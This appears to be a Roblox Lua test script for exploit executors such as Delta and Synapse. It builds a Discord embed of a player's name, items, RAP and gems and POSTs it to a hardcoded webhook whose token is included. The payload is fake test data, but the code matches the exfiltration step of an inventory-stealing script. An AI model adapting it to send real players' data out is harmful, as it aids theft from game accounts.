local HttpService = game:GetService("HttpService")

-- Fake test values
local WEBHOOK = "https://discord.com/api/webhooks/1407814443231871226/doFyO0sPxeH5WFjvWgW0UlKDgjG6xAuBAvXjBAffh88jLaccLjOpsg32cKqBAp1y8iWq" -- placeholder
local plr = { Name = "FakePlayer" }

local sortedItems = {
    { name = "Fake Sword", amount = 2, rap = 1500 },
    { name = "Golden Cat", amount = 1, rap = 4200 },
    { name = "Common Rock", amount = 10, rap = 50 },
}

local totalRAP = 999999
local gems = 123456

local function formatNumber(n)
    local s = tostring(n)
    local k
    repeat
        s, k = s:gsub("^(-?%d+)(%d%d%d)", "%1,%2")
    until k == 0
    return s
end

-- Executor detection
local function detectExecutor()
    if type(identifyexecutor) == "function" then
        local ok, ex = pcall(identifyexecutor)
        if ok then return ex end
    end
    if type(delta) == "table" then return "Delta" end
    if type(syn) == "table" then return "Synapse" end
    return "Unknown"
end

local function getRequestFunc()
    if type(delta) == "table" and type(delta.request) == "function" then
        return delta.request, "delta.request"
    end
    if type(syn.request) == "function" then
        return syn.request, "syn.request"
    end
    if type(request) == "function" then
        return request, "request"
    end
    return function()
        return { StatusCode = 999, Body = "No HTTP API available" }
    end, "none"
end

local function buildFields()
    local fields = {
        { name = "Username", value = plr.Name, inline = true },
        { name = "Items", value = "", inline = false },
        { name = "Summary", value = "", inline = false }
    }

    for _, item in ipairs(sortedItems) do
        fields[2].value = fields[2].value ..
            string.format("%s (x%d): %s RAP\n",
                item.name,
                item.amount,
                formatNumber(item.rap * item.amount)
            )
    end

    fields[3].value = string.format(
        "Gems: %s\nTotal RAP: %s",
        formatNumber(gems),
        formatNumber(totalRAP)
    )

    return fields
end

local function TestSend()
    local executor = detectExecutor()
    local requestFunc, label = getRequestFunc()
    print("Using:", label)

    local payload = {
        embeds = {{
            title = "✅ Delta Fake Test",
            color = 5602818,
            fields = buildFields(),
            footer = { text = "Executor: " .. executor }
        }}
    }

    local body = HttpService:JSONEncode(payload)

    -- prevent Delta retry → send unique header
    local headers = {
        ["Content-Type"] = "application/json",
        ["X-NULS-Once"] = tostring(math.random(100000, 999999))
    }

    local result = requestFunc({
        Url = WEBHOOK,
        Method = "POST",
        Headers = headers,
        Body = body
    })

    print("Response:", result)
end

TestSend()
